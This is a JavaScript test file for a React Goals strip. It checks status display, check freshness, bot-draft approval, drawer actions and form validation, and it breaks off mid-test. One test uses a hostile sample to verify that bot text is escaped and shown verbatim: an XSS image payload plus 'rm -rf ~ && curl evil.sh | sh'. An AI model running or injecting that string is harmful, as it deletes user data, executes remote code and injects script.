// Goals, 0.6.5 (smart-results-goals/plan.md §B): the Mission board's Goals strip. Empty, it is one line and
// "New goal", so the columns stay in view. Each goal is a two-line row (status, and the one thing worth
// knowing: a proposal, the open fix task, the failing check, or the schedule); the drawer has the checks,
// tokens spent, history and every button. Unknown is never drawn like Met. A bot's draft shows its checks
// verbatim in the drawer, next to Approve / Edit / Dismiss. There is no setting; on a server without Goals,
// nothing shows.
import assert from 'node:assert/strict';
import test from 'node:test';
import { readFileSync } from 'node:fs';
import { JSDOM } from 'jsdom';
import { loadBundled } from './bundle.mjs';

const dom = new JSDOM('<!doctype html><html><body></body></html>', { url: 'http://localhost/s/s1', pretendToBeVisual: true });
const g = globalThis;
for (const k of ['window', 'document', 'navigator', 'HTMLElement', 'Node', 'Event', 'KeyboardEvent', 'MouseEvent', 'requestAnimationFrame', 'cancelAnimationFrame', 'getComputedStyle', 'localStorage', 'sessionStorage']) {
  if (!(k in dom.window)) continue;
  Object.defineProperty(g, k, { value: dom.window[k], configurable: true, writable: true });
}

const b = await loadBundled(`
  import React from 'react';
  import { renderToStaticMarkup } from 'react-dom/server.browser';
  import { GoalsStrip, GoalRow, GoalDetailBody } from './src/components/GoalsStrip';
  export { default as React } from 'react';
  export { createRoot } from 'react-dom/client';
  export { GoalsStrip, GoalRow, GoalDetailBody, GoalForm, GoalStatusPill, GoalTimeline, KeepTrueBox, declinedText } from './src/components/GoalsStrip';
  export * from './src/goals';
  export { emitMission, MissionError } from './src/missions';
  export const stripHtml = (p) => renderToStaticMarkup(React.createElement(GoalsStrip, p));
  export const rowHtml = (p) => renderToStaticMarkup(React.createElement(GoalRow, { onOpen() {}, ...p }));
  export const detailHtml = (p) => renderToStaticMarkup(React.createElement(GoalDetailBody, { busy: false, error: null, onAction() {}, ...p }));
`);

const text = (html) => html.replace(/<[^>]+>/g, ' ').replace(/&#x27;|&#39;/g, "'").replace(/&quot;/g, '"').replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&amp;/g, '&').replace(/\s+/g, ' ').trim();
const settle = async (ms = 0) => {
  if (ms) await new Promise((r) => setTimeout(r, ms));
  for (let i = 0; i < 10; i++) await new Promise((r) => setTimeout(r, 0));
};
// Plan v2 B.0: the strip folds to one line while all is well; these tests mostly look at the open list.
localStorage.setItem('kwnt.goals.open', '1');
const NOW = Date.parse('2026-11-02T12:00:00Z');
const minsAgo = (m) => new Date(NOW - m * 60_000).toISOString();
const minsAhead = (m) => new Date(NOW + m * 60_000).toISOString();
const names = { k_sandy: 'Sandy', k_cody: 'Cody' };

const check = (over = {}) => ({
  id: 'c1', label: 'Site answers', kind: 'http', spec: { url: 'https://kwant.si', expect_status: 200 }, required: true, freshness_minutes: null,
  latest: { status: 'passed', verdict: 'met', excerpt: 'HTTP 200', observed_at: minsAgo(10) }, ...over,
});
const goal = (over = {}) =>
  b.parseGoal({
    id: 'g1', space_id: 's1', title: 'The site stays up', description: 'kwant.si answers.', kwant_id: 'k_cody', status: 'met', mode: 'suggest',
    interval_minutes: 60, created_by: 'person', last_checked_at: minsAgo(10), next_check_at: minsAhead(50), created_at: minsAgo(600), updated_at: minsAgo(10),
    checks: [check()], open_mission: null, ...over,
  });

// A server that remembers what was done to a goal, so the drawer's re-read agrees with the button's answer.
function fakeApi(list, over = {}) {
  const calls = [];
  let n = 0;
  const store = list.map((x) => ({ ...x }));
  const find = (id) => store.find((y) => y.id === id);
  const set = (id, patch) => Object.assign(find(id) ?? {}, patch);
  return {
    calls,
    list: async () => (calls.push(['list']), store.map((x) => ({ ...x }))),
    get: async (id) => {
      calls.push(['get', id]);
      const x = find(id) ?? goal({ id });
      return b.parseGoalDetail({
        goal: x, checks: x.checks, spent_tokens: 12_000,
        events: [
          { id: 'e1', kind: 'created', actor: 'person', detail: {}, created_at: minsAgo(600) },
          { id: 'e2', kind: 'checked', actor: 'kwant', detail: { verdict: 'not_met', passed: 0, total: 1 }, created_at: minsAgo(120) },
          { id: 'e3', kind: 'fix_opened', actor: 'kwant', detail: { task_id: 't_fix', task_title: 'Fix: The site stays up: Site answers failing' }, created_at: minsAgo(119) },
          { id: 'e4', kind: 'met', actor: 'kwant', detail: {}, created_at: minsAgo(10) },
        ],
        fix_tasks: [{ id: 't_fix', title: 'Fix: The site stays up: Site answers failing', state: 'verified', created_at: minsAgo(119) }],
      });
    },
    create: async (d, key) => (calls.push(['create', d, key]), goal({ id: `new${++n}`, title: d.title, status: 'checking', checks: [] })),
    update: async (id, patch) => (calls.push(['update', id, patch]), goal({ ...set(id, { status: patch.paused ? 'paused' : 'unknown' }) })),
    approve: async (id, key) => (calls.push(['approve', id, key]), goal({ ...set(id, { status: 'checking' }) })),
    check: async (id, key) => (calls.push(['check', id, key]), set(id, { status: 'checking', checking_since: minsAgo(0) }), null),
    remove: async (id) => (calls.push(['remove', id]), store.splice(store.indexOf(find(id)), 1), true),
    ...over,
  };
}

async function mount(Component, props) {
  const host = document.createElement('div');
  document.body.appendChild(host);
  const root = b.createRoot(host);
  root.render(b.React.createElement(Component, props));
  await settle();
  const q = (sel) => host.querySelector(sel);
  return {
    host,
    q,
    text: () => document.body.textContent.replace(/\s+/g, ' '),
    click: async (sel) => {
      const el = q(sel);
      assert.ok(el, `no ${sel}`);
      el.dispatchEvent(new dom.window.MouseEvent('click', { bubbles: true }));
      await settle();
    },
    type: async (sel, value) => {
      const el = q(sel);
      assert.ok(el, `no ${sel}`);
      const proto = el.tagName === 'TEXTAREA' ? dom.window.HTMLTextAreaElement.prototype : el.tagName === 'SELECT' ? dom.window.HTMLSelectElement.prototype : dom.window.HTMLInputElement.prototype;
      Object.getOwnPropertyDescriptor(proto, 'value').set.call(el, value);
      el.dispatchEvent(new dom.window.Event(el.tagName === 'SELECT' ? 'change' : 'input', { bubbles: true }));
      await settle();
    },
    open: async (id) => {
      const el = q(`[data-goal="${id}"] [data-goal-open]`);
      assert.ok(el, `no row ${id}`);
      el.focus();
      el.dispatchEvent(new dom.window.MouseEvent('click', { bubbles: true }));
      await settle();
      assert.ok(q(`[data-goal-detail="${id}"]`), `drawer for ${id}`);
    },
    done: () => {
      root.unmount();
      host.remove();
    },
  };
}

test('still loading, or on a server without Goals, the board shows nothing new', async () => {
  const api = fakeApi([goal()]);
  // The strip waits for the list, and shows nothing until it loads.
  assert.equal(b.stripHtml({ names, now: NOW, initial: { goals: null }, api }), '');
  assert.notEqual(b.stripHtml({ names, now: NOW, initial: { goals: [] }, api }), '');

  const old = fakeApi([], { list: async () => { throw new b.GoalError('This server doesn’t have Goals yet.', 404); } });
  const m = await mount(b.GoalsStrip, { names, now: NOW, api: old });
  assert.equal(m.host.innerHTML.length, 0, 'an older server: nothing at all');
  m.done();
});

test('the empty state is one line and New goal, with no list to push the columns down', () => {
  const html = b.stripHtml({ names, now: NOW, initial: { goals: [] }, api: fakeApi([]) });
  const t = text(html);
  assert.match(t, /^Goals What should stay true\? Say it in a sentence and a bot drafts the checks\. New goal$/);
  assert.match(html, /data-goals-empty/);
  assert.doesNotMatch(html, /data-goals-toggle/, 'nothing to show or hide');
  assert.doesNotMatch(html, /<ul/);
  assert.doesNotMatch(html, /[\u{1F300}-\u{1FAFF}]/u, 'no emoji in UI copy');
});

test('Unknown is never drawn like Met: its own word, colour, outline and icon', () => {
  const met = b.goalStatusLook('met');
  const unknown = b.goalStatusLook('unknown');
  assert.equal(met.label, 'OK');
  assert.equal(unknown.label, 'Can’t check');
  assert.notEqual(unknown.tone, met.tone);
  assert.notEqual(unknown.icon, met.icon);
  // A status this build doesn't know reads as Unknown, never as Met.
  assert.deepEqual(b.goalStatusLook('something_new'), unknown);
  assert.equal(b.parseGoal({ id: 'x' }).status, 'unknown', 'no status from the server is Unknown');

  const html = b.stripHtml({ names, now: NOW, initial: { goals: [goal({ id: 'a', status: 'met' }), goal({ id: 'b', status: 'unknown' })] }, api: fakeApi([]) });
  const pill = (status) => html.match(new RegExp(`<span[^>]*data-goal-status="${status}"[^>]*>.*?</span>`))[0];
  assert.match(pill('met'), /emerald/);
  assert.match(pill('unknown'), /border-dashed/);
  assert.doesNotMatch(pill('unknown'), /emerald/);
  assert.match(pill('unknown'), /lucide-circle-help|circle-question/);
  assert.doesNotMatch(pill('unknown'), /circle-check/);
  assert.match(text(pill('unknown')), /^Can’t check$/);

  for (const s of ['draft', 'checking', 'met', 'not_met', 'fixing', 'unknown', 'needs_you', 'paused']) {
    const look = b.goalStatusLook(s);
    assert.ok(look.label && look.hint, s);
    if (s !== 'met') assert.notEqual(look.tone === 'emerald' && look.icon === 'met', true, `${s} must not look Met`);
  }
});

test('a check reads Passed, Failed, Couldn’t run, Out of date or Not checked yet; only Passed counts toward Met', () => {
  assert.deepEqual(b.checkLook(check(), 60, NOW), { label: 'Passed', tone: 'emerald', verdict: 'met' });
  assert.equal(b.checkLook(check({ latest: { status: 'failed', verdict: 'not_met', excerpt: '', observed_at: minsAgo(5) } }), 60, NOW).label, 'Failed');
  const err = b.checkLook(check({ latest: { status: 'error', verdict: 'unknown', excerpt: '', observed_at: minsAgo(5) } }), 60, NOW);
  assert.equal(err.label, 'Couldn’t run');
  assert.equal(err.verdict, 'unknown');
  // Stale: older than freshness (default twice the interval) is Unknown, even when it passed.
  const stale = b.checkLook(check({ latest: { status: 'passed', verdict: 'met', excerpt: '', observed_at: minsAgo(121) } }), 60, NOW);
  assert.deepEqual(stale, { label: 'Out of date', tone: 'zinc', verdict: 'unknown' });
  assert.equal(b.checkLook(check({ freshness_minutes: 5, latest: { status: 'passed', verdict: 'met', excerpt: '', observed_at: minsAgo(6) } }), 60, NOW).label, 'Out of date');
  assert.equal(b.checkLook(check({ latest: null }), 60, NOW).label, 'Not checked yet');

  const row = text(b.rowHtml({ goal: goal({ status: 'unknown', checks: [check({ latest: { status: 'passed', verdict: 'met', excerpt: '', observed_at: minsAgo(200) } })] }), names, now: NOW }));
  assert.match(row, /^The site stays up Can’t check HTTP status = 200 · Out of date · 3 h ago$/, row);

  // A goal stored as Met whose required check is out of date, missing or couldn't run shows as Unknown.
  const staleMet = goal({ status: 'met', checks: [check({ latest: { status: 'passed', verdict: 'met', excerpt: '', observed_at: minsAgo(200) } })] });
  assert.equal(b.shownStatus(staleMet, NOW), 'unknown');
  assert.equal(b.shownStatus(goal({ checks: [check({ latest: null })] }), NOW), 'unknown');
  assert.equal(b.shownStatus(goal({ checks: [check({ latest: { status: 'error', verdict: 'unknown', excerpt: '', observed_at: minsAgo(5) } })] }), NOW), 'unknown');
  assert.equal(b.shownStatus(goal({ checks: [check(), check({ id: 'c2', required: false, latest: null })] }), NOW), 'met', 'an optional check does not hold Met back');
  assert.equal(b.shownStatus(goal(), NOW), 'met');
  const strip = b.stripHtml({ names, now: NOW, initial: { goals: [staleMet] }, api: fakeApi([]) });
  assert.match(strip, /data-goal-status="unknown"/);
  assert.doesNotMatch(strip, /data-goal-status="met"/);
  assert.doesNotMatch(text(strip), /1 met/);
});

test('a goal row is two short lines: status, then the fix task, the failing check, or the schedule', async () => {
  const fixTask = { id: 't_fix', title: 'Fix: The site stays up: Site answers failing', state: 'ready', held: true, created_at: minsAgo(30) };
  const failed = check({ latest: { status: 'failed', verdict: 'not_met', excerpt: 'HTTP 502', observed_at: minsAgo(10) } });
  const fixing = goal({ status: 'fixing', fix_tasks: [fixTask], spent_tokens: 12_400, checks: [failed] });
  assert.equal(text(b.rowHtml({ goal: fixing, names, now: NOW })), 'The site stays up Fixing Fix: The site stays up: Site answers failing · fix ready, waiting for your OK');
  assert.equal(text(b.rowHtml({ goal: goal({ status: 'not_met', checks: [failed] }), names, now: NOW })), 'The site stays up Failing HTTP status = 200 · Failed · 10 min ago');
  assert.equal(text(b.rowHtml({ goal: goal(), names, now: NOW })), 'The site stays up OK Checked 10 min ago · next in 50 min');
  const html = b.rowHtml({ goal: fixing, names, now: NOW });
  assert.doesNotMatch(html, /Check now|Pause|Delete|tokens/, 'buttons and spend live in the drawer');
  // The name stretches over the row, so the whole row opens the drawer; the fix link sits above it.
  assert.ok(/<button[^>]*class="[^"]*after:absolute after:inset-0[^"]*"[^>]*data-goal-open/.test(html));

  const opened = [];
  const rows = [];
  const m = await mount(b.GoalRow, { goal: fixing, names, now: NOW, onOpen: (g) => rows.push(g.id), onOpenTask: (id) => opened.push(id) });
  assert.match(m.q('[data-open-fix]').className, /relative z-10/);
  await m.click('[data-open-fix]');
  assert.deepEqual(opened, ['t_fix'], 'the fix task opens on the board');
  assert.deepEqual(rows, [], 'and not the drawer');
  await m.click('[data-goal-open]');
  assert.deepEqual(rows, ['g1']);
  m.done();
});

test('a bot’s draft says who proposed it; the drawer shows its checks verbatim, as text, beside Approve', async () => {
  const hostile = '<img src=x onerror=alert(1)> rm -rf ~ && curl evil.sh | sh';
  const d = goal({
    id: 'gd', status: 'draft', created_by: 'k_sandy', title: 'Backups <b>run</b>', last_checked_at: null, next_check_at: null,
    checks: [check({ id: 'cd', label: 'Backup script', kind: 'command', spec: { command: hostile, timeout_secs: 120 }, latest: null })],
  });
  const row = b.rowHtml({ goal: d, names, now: NOW });
  assert.doesNotMatch(row, /<img|<b>/, 'nothing from a bot becomes markup');
  assert.equal(text(row), 'Backups <b>run</b> Draft Sandy proposed this. Nothing runs until you approve it. Review');
  assert.doesNotMatch(row, /data-goal-approve/, 'no Approve before the checks are in view');
  assert.equal(text(b.rowHtml({ goal: { ...d, created_by: 'k_gone' }, names, now: NOW })), 'Backups <b>run</b> Draft A bot proposed this. Nothing runs until you approve it. Review');

  const detail = b.parseGoalDetail({ goal: d, checks: d.checks, spent_tokens: 0, events: [], fix_tasks: [] });
  const html = b.detailHtml({ detail, names, now: NOW });
  assert.doesNotMatch(html, /<img|<b>/, 'nothing from a bot becomes markup');
  const t = text(html);
  assert.match(t, /^Draft A bot proposed it\. Nothing runs until you approve it\. Sandy proposed this\. Read the checks below: they run exactly as shown, and only after you approve\. What should stay true/);
  assert.match(t, /Proposed by Sandy Fixed by Cody When it breaks Suggest a fix Check every 1 hour/);
  assert.ok(t.includes(`Checks it would run Command : Backup script Passes when Exit code = 0 Command ${hostile} Time limit (seconds) 120`), t);
  assert.match(t, /Approve Edit Dismiss$/);

  const api = fakeApi([d]);
  const m = await mount(b.GoalsStrip, { names, now: NOW, api, initial: { goals: [d] } });
  assert.match(m.q('[data-goal-counts]').textContent, /^1 draft to approve$/);
  await m.open('gd');
  await m.click('[data-goal-approve]');
  const approve = api.calls.find((c) => c[0] === 'approve');
  assert.equal(approve[1], 'gd');
  assert.ok(approve[2], 'approve sends an Idempotency-Key');
  await settle();
  assert.equal(m.q('[data-goal="gd"]').dataset.status, 'checking');
  assert.ok(!m.q('[data-goal-approve]'), 'the drawer reads it again: no longer a draft');
  assert.match(m.q('[data-goals-notice]').textContent, /Approved: “Backups <b>run<\/b>” is being checked now\./);
  m.done();

  // Dismiss asks first, then deletes the draft and closes the drawer; focus lands on New goal.
  const api2 = fakeApi([d]);
  const m2 = await mount(b.GoalsStrip, { names, now: NOW, api: api2, initial: { goals: [d] } });
  await m2.open('gd');
  await m2.click('[data-goal-dismiss]');
  assert.match(m2.q('[data-confirm-delete]').textContent, /Dismiss this proposal\? Nothing has run\./);
  assert.ok(document.activeElement === m2.q('[data-confirm-yes]'), 'focus moves to the confirm');
  await m2.click('[data-confirm-yes]');
  assert.deepEqual(api2.calls.at(-1), ['remove', 'gd']);
  assert.ok(!m2.q('[data-goal="gd"]'));
  assert.ok(!m2.q('[role="dialog"]'), 'the drawer closes');
  assert.ok(document.activeElement === m2.q('[data-new-goal]'), 'focus goes to New goal, not the page');
  m2.done();
});

test('Check now, Pause and Delete are in the drawer and call the server; a goal deleted elsewhere just leaves', async () => {
  const g1 = goal();
  const api = fakeApi([g1]);
  const m = await mount(b.GoalsStrip, { names, now: NOW, api, initial: { goals: [g1] } });
  assert.ok(!m.q('[data-goal-check-now]'), 'no buttons on the row');
  await m.open('g1');
  await m.click('[data-goal-check-now]');
  const chk = api.calls.find((c) => c[0] === 'check');
  assert.ok(chk && chk[2], 'check sends an Idempotency-Key');
  await settle();
  // No goal in the answer: it shows as checking until the live update arrives.
  assert.equal(m.q('[data-goal="g1"]').dataset.status, 'checking');
  assert.equal(m.q('[data-goal-check-now]').disabled, true, 'no second check while one runs');
  m.done();

  const api2 = fakeApi([g1]);
  const m2 = await mount(b.GoalsStrip, { names, now: NOW, api: api2, initial: { goals: [g1] } });
  await m2.open('g1');
  await m2.click('[data-goal-pause="pause"]');
  await settle();
  assert.deepEqual(api2.calls.find((c) => c[0] === 'update'), ['update', 'g1', { paused: true }]);
  assert.equal(m2.q('[data-goal="g1"]').dataset.status, 'paused');
  assert.match(m2.q('[data-goal="g1"] [data-goal-schedule]').textContent, /Paused, no checks until you resume/);
  assert.ok(m2.q('[data-goal-pause="resume"]'));
  // A paused goal can still be checked by hand (Rigel Q10).
  assert.equal(m2.q('[data-goal-check-now]').disabled, false);
  m2.done();

  const gone = fakeApi([g1, goal({ id: 'g2', title: 'Second' })], { remove: async () => { throw new b.GoalError('Not found', 404); } });
  const m3 = await mount(b.GoalsStrip, { names, now: NOW, api: gone, initial: { goals: [g1, goal({ id: 'g2', title: 'Second' })] } });
  await m3.open('g1');
  await m3.click('[data-goal-delete]');
  assert.match(m3.q('[data-confirm-delete]').textContent, /Delete this goal\? Its checks and history go too\. Open fix work stays on the board\./);
  await m3.click('[data-confirm-yes]');
  assert.ok(!m3.q('[data-goal="g1"]'));
  assert.ok(m3.q('[data-goal="g2"]'));
  assert.ok(!m3.q('[role="dialog"]'), 'the drawer closes');
  assert.match(m3.q('[data-goals-notice]').textContent, /already deleted/);
  m3.done();

  const denied = fakeApi([g1], { check: async () => { throw new b.GoalError('Only you can change goals.', 403); } });
  const m4 = await mount(b.GoalsStrip, { names, now: NOW, api: denied, initial: { goals: [g1] } });
  await m4.open('g1');
  await m4.click('[data-goal-check-now]');
  assert.equal(m4.q('[data-goal-detail-error]').textContent, 'Only you can change goals.');
  assert.equal(m4.q('[data-goal-detail-error]').getAttribute('role'), 'alert');
  // The row keeps it in view after the drawer closes, without announcing it a second time.
  assert.equal(m4.q('[data-goal="g1"] [data-goal-error]').textContent, 'Only you can change goals.');
  assert.equal(m4.q('[data-goal="g1"] [data-goal-error]').getAttribute('role'), null);
  m4.done();
});

test('New goal validates in plain words, focuses the first problem, and creates once', async () => {
  const empty = b.goalFormErrors(b.formFromGoal(null));
  assert.equal(empty.title, 'Give the goal a short name.');
  assert.equal(empty.kwantId, 'Pick the bot that fixes it, or choose Just tell me.');
  assert.equal(Object.values(empty.rows)[0], 'Type the web address to open.');
  const watch = b.goalFormErrors({ ...b.formFromGoal(null), mode: 'watch' });
  assert.equal(watch.kwantId, undefined, 'Just tell me needs no bot');
  const http = { ...b.emptyCheckRow('http'), url: 'kwant.si' };
  assert.equal(b.checkRowError(http), 'The address should start with http:// or https://.');
  assert.equal(b.checkRowError({ ...http, url: 'https://kwant.si', target: '99' }), 'The HTTP status is a number from 100 to 599, like 200.');
  assert.equal(b.checkRowError({ ...b.emptyCheckRow('file_sha256'), path: 'a', sha256: 'xyz' }), 'A fingerprint is 64 letters and digits (0–9 and a–f).');
  const none = b.goalFormErrors({ ...b.formFromGoal(null), title: 'x', kwantId: 'k', checks: [{ ...b.emptyCheckRow(), command: 'true', required: false }] });
  assert.equal(none.checks, 'Keep at least one check required: OK needs one.');

  const api = fakeApi([]);
  const m = await mount(b.GoalsStrip, { names, now: NOW, api, initial: { goals: [] }, openPanel: 'form' });
  assert.ok(m.q('[role="dialog"]'), 'the form opens in a panel');
  assert.match(m.q('[role="dialog"] h3').textContent, /New goal/);
  await m.click('[data-goal-save]');
  await settle(20);
  assert.equal(api.calls.length, 0, 'nothing saved with errors');
  const title = m.q('[data-field="title"]');
  assert.equal(title.getAttribute('aria-invalid'), 'true');
  assert.ok(document.activeElement === title, 'focus lands on the first problem');
  assert.match(m.text(), /Give the goal a short name\./);

  await m.type('[data-field="title"]', 'The site stays up');
  await m.type('[data-field="bot"]', 'k_cody');
  await m.type('[data-check-row] input[placeholder="https://example.com/health"]', 'https://kwant.si');
  const save = m.q('[data-goal-save]');
  save.dispatchEvent(new dom.window.MouseEvent('click', { bubbles: true }));
  save.dispatchEvent(new dom.window.MouseEvent('click', { bubbles: true }));
  await settle();
  const creates = api.calls.filter((c) => c[0] === 'create');
  assert.equal(creates.length, 1, 'one goal, even on a double press');
  const sent = creates[0][1];
  assert.deepEqual({ ...sent, checks: undefined }, {
    title: 'The site stays up', description: '', kwant_id: 'k_cody', interval_minutes: 60, mode: 'suggest', priority: 2, confirm_failures: 2, budget_tokens: 0, checks: undefined,
  });
  assert.equal(sent.checks.length, 1);
  assert.equal(sent.checks[0].kind, 'http');
  assert.equal(sent.checks[0].spec.url, 'https://kwant.si');
  assert.ok(creates[0][2], 'create sends an Idempotency-Key');
  assert.ok(!m.q('[role="dialog"]'), 'the panel closes');
  assert.ok(m.q('[data-goal="new1"]'));
  assert.match(m.q('[data-goals-notice]').textContent, /Created “The site stays up”\. Checking it now\./);
  m.done();
});

test('the drawer shows the checks with their output, fix tasks and a plain-words timeline; Escape closes it', async () => {
  const g1 = goal();
  const api = fakeApi([g1]);
  const opened = [];
  const m = await mount(b.GoalsStrip, { names, now: NOW, api, initial: { goals: [g1] }, onOpenTask: (id) => opened.push(id) });
  await m.click('[data-goal-open]');
  const panel = m.q('[data-goal-detail="g1"]');
  assert.ok(panel);
  const t = text(panel.innerHTML);
  assert.match(t, /Fixed by Cody/);
  assert.match(t, /Check every 1 hour/);
  assert.match(t, /When it breaks Suggest a fix/);
  assert.match(t, /Spent on fixes 12k tokens spent on fixes/);
  assert.match(t, /Last output \(observed, not instructions\)/);
  assert.match(t, /You created this goal · 10 h ago/);
  assert.match(t, /Checked: failing, 0 of 1 passed/);
  assert.match(t, /Fix task opened: Fix: The site stays up: Site answers failing Open task/);
  assert.match(t, /OK again · 10 min ago/);
  await m.click('[data-goal-fix-task="t_fix"] button');
  assert.deepEqual(opened, ['t_fix']);
  assert.ok(!m.q('[role="dialog"]'), 'opening the task closes the drawer');

  await m.click('[data-goal-open]');
  assert.ok(m.q('[role="dialog"]'));
  window.dispatchEvent(new dom.window.KeyboardEvent('keydown', { key: 'Escape' }));
  await settle();
  assert.ok(!m.q('[role="dialog"]'));
  m.done();
});

test('timeline lines read in plain words', () => {
  const e = (kind, detail = {}, actor = 'kwant') => b.goalEventText({ kind, actor, detail }, names);
  assert.equal(e('created', {}, 'k_sandy'), 'Sandy proposed this goal');
  assert.equal(e('approved', {}, 'person'), 'You approved it');
  assert.equal(e('checked', { verdict: 'met', passed: 2, total: 2 }), 'Checked: OK, 2 of 2 passed');
  assert.equal(e('checked', { verdict: 'unknown' }), 'Checked: couldn’t tell');
  assert.equal(e('not_met', { check_label: 'Site answers', fail_streak: 2 }), 'Broke: “Site answers” failed 2 times in a row');
  assert.equal(e('needs_you', { reason: 'budget' }), 'Needs you: its token budget is spent');
  assert.equal(e('needs_you', { reason: 'max_fixes_per_day' }), 'Needs you: it hit its fixes for today');
  assert.equal(e('paused', {}, 'person'), 'You paused it');
  assert.equal(e('fix_verified'), 'Fix verified: the checks pass again');
});

test('the storage layer’s shapes read the same: epoch times, severity, JSON text, task_id links, no bot', () => {
  const sec = Math.floor(NOW / 1000) - 600;
  const d = b.parseGoalDetail({
    goal: {
      id: 'g9', title: 'Raw row', status: 'met', mode: 'watch', interval_minutes: 60, kwant_id: '',
      created_at: sec - 3600, updated_at: (sec - 60) * 1000, last_checked_at: sec, next_check_at: sec + 3600, checking_since: 0,
    },
    checks: [
      { id: 'c1', label: 'Site answers', kind: 'http', severity: 'required', spec: '{"url":"https://kwant.si","expect_status":200}', freshness_minutes: 120,
        latest: { status: 'passed', verdict: 'met', excerpt: 'HTTP 200', observed_at: sec, expires_at: sec + 7200 } },
      { id: 'c2', label: 'Nice to have', kind: 'shell', severity: 'advisory', spec: 'not json' },
      { id: 'c3', label: 'Override', kind: 'shell', severity: 'advisory', required: true, spec: {} },
    ],
    events: [
      { id: 'e2', kind: 'approved', actor: 'you', detail: '{}', created_at: sec - 1800 },
      { id: 'e1', kind: 'created', actor: 'k_sandy', detail: '{"mode":"watch"}', created_at: sec - 3600 },
    ],
    fix_tasks: [{ task_id: 't1', created_at: sec, state: 'working', spent_tokens: 1200 }],
    spent_tokens: 1200,
  });
  const g = d.goal;
  assert.equal(g.kwant_id, null, 'an empty bot id is no bot');
  assert.equal(g.created_at, new Date((sec - 3600) * 1000).toISOString(), 'epoch seconds become ISO');
  assert.equal(g.updated_at, new Date((sec - 60) * 1000).toISOString(), 'epoch milliseconds become ISO');
  assert.equal(g.last_checked_at, new Date(sec * 1000).toISOString());
  assert.equal(g.checking_since, null, 'zero is not a time');
  const [c1, c2, c3] = d.checks;
  assert.equal(c1.required, true);
  assert.equal(c1.spec.url, 'https://kwant.si', 'spec stored as JSON text is read');
  assert.equal(c1.latest.observed_at, new Date(sec * 1000).toISOString());
  assert.equal(c2.required, false, 'advisory severity is informational');
  assert.deepEqual(c2.spec, {}, 'unreadable spec is empty, not a crash');
  assert.equal(c3.required, true, 'an explicit required wins');
  assert.deepEqual(d.events.map((e) => e.id), ['e1', 'e2'], 'events sort by time, not by text');
  assert.equal(d.events[0].detail.mode, 'watch', 'detail stored as JSON text is read');
  assert.equal(d.fix_tasks[0].id, 't1');
  assert.equal(d.fix_tasks[0].title, 'Fix task', 'a link without a title still reads');
  assert.equal(g.open_fix_task?.id, 't1');
  assert.equal(b.shownStatus({ ...g, checks: [c1, c2] }, NOW), 'met', 'a fresh Met from epoch times stays Met; an advisory check doesn’t hold it back');
  assert.equal(b.shownStatus(g, NOW), 'unknown', 'a required check never run keeps it Unknown');
  const expired = { ...c1, latest: { ...c1.latest, expires_at: new Date(NOW - 1000).toISOString() } };
  assert.equal(b.checkLook(expired, 60, NOW).label, 'Out of date', 'past the server’s expiry, a pass is out of date');
  assert.equal(b.shownStatus({ ...g, checks: [expired] }, NOW), 'unknown');
});

test('live: goal changes reload the strip once per burst; there is no switch', async () => {
  let list = [goal()];
  const api = fakeApi([], {
    list: async () => (api.calls.push(['list']), list.map((x) => ({ ...x }))),
    get: async () => b.parseGoalDetail({ goal: list[0], checks: list[0].checks, spent_tokens: 0, events: [], fix_tasks: [] }),
  });
  const m = await mount(b.GoalsStrip, { names, now: NOW, api });
  assert.equal(api.calls.filter((c) => c[0] === 'list').length, 1);
  assert.equal(m.q('[data-goal="g1"]').dataset.status, 'met');

  list = [goal({ status: 'not_met' })];
  b.emitMission({ type: 'goal_updated', data: { id: 'g1', status: 'checking' } });
  b.emitMission({ type: 'goal_updated', data: { id: 'g1', status: 'not_met' } });
  await settle(300);
  assert.equal(api.calls.filter((c) => c[0] === 'list').length, 2, 'two events, one read');
  assert.equal(m.q('[data-goal="g1"]').dataset.status, 'not_met');

  assert.ok(m.q('[data-goals-strip]'), 'no setting can hide it');
  m.done();
});

test('many goals: collapsed it shows only what wants a look; Show all brings the rest, and the choice is kept', async () => {
  const long = 'A very long goal title that keeps going and going without a single break '.repeat(3);
  const needs = { open_mission: { id: 'm1', title: 'Restore', status: 'active', attempt: 1, opened_at: minsAgo(20), run_task_id: 't_run', cause: 'The disk is full.' } };
  const many = Array.from({ length: 30 }, (_, i) => goal({ id: `g${i}`, title: `${long}${i}`, status: i === 17 ? 'needs_you' : i === 5 ? 'not_met' : 'met', ...(i === 5 ? needs : {}) }));
  const api = fakeApi([]);
  localStorage.setItem('kwnt.goals.open', '0');
  const m = await mount(b.GoalsStrip, { names, now: NOW, api, initial: { goals: many } });
  const cards = () => [...m.host.querySelectorAll('[data-goal]')];
  assert.equal(cards().length, 2, 'only the two that want a look');
  assert.deepEqual(cards().map((c) => c.dataset.status), ['needs_you', 'needs_you']);
  assert.match(m.q('[data-goal-counts]').textContent, /2 need you · 28 OK/);
  assert.equal(m.q('[data-goals-toggle]').getAttribute('aria-expanded'), 'false');
  assert.equal(m.q('[data-goals-toggle]').textContent, 'Show all 30');
  // One line each: the name is cut short, and the full name is a hover away and in the drawer.
  for (const c of cards()) {
    const t = c.querySelector('[data-goal-open]');
    assert.match(t.className, /\btruncate\b/);
    assert.ok(t.getAttribute('title') === t.textContent);
  }
  await m.click('[data-goals-toggle]');
  assert.equal(cards().length, 30);
  assert.equal(m.q('[data-goals-toggle]').textContent, 'Show less');
  assert.equal(localStorage.getItem('kwnt.goals.open'), 'true');
  m.done();
  // Remembered: the next board opens the list.
  const m2 = await mount(b.GoalsStrip, { names, now: NOW, api, initial: { goals: many } });
  assert.equal(m2.host.querySelectorAll('[data-goal]').length, 30);
  m2.done();
  localStorage.setItem('kwnt.goals.open', '1');
});

test('on a phone, with all goals well, the strip is one line until opened; something needing you shows as a row', async () => {
  const had = Object.getOwnPropertyDescriptor(window, 'matchMedia');
  window.matchMedia = (q) => ({ matches: q === '(max-width: 639px)', addEventListener() {}, removeEventListener() {} });
  localStorage.setItem('kwnt.goals.open', '0');
  try {
    const api = fakeApi([]);
    const well = [goal({ id: 'a' }), goal({ id: 'b', title: 'Second' })];
    const m = await mount(b.GoalsStrip, { names, now: NOW, api, initial: { goals: well } });
    assert.equal(m.host.querySelectorAll('[data-goal]').length, 0);
    assert.match(m.q('[data-goal-counts]').textContent, /2 goals OK · checked 10 min ago/);
    m.done();
    const m2 = await mount(b.GoalsStrip, { names, now: NOW, api, initial: { goals: [...well, goal({ id: 'c', status: 'needs_you' })] } });
    assert.equal(m2.host.querySelectorAll('[data-goal]').length, 1);
    assert.equal(m2.q('[data-goal]').dataset.status, 'needs_you');
    m2.done();
  } finally {
    localStorage.setItem('kwnt.goals.open', '1');
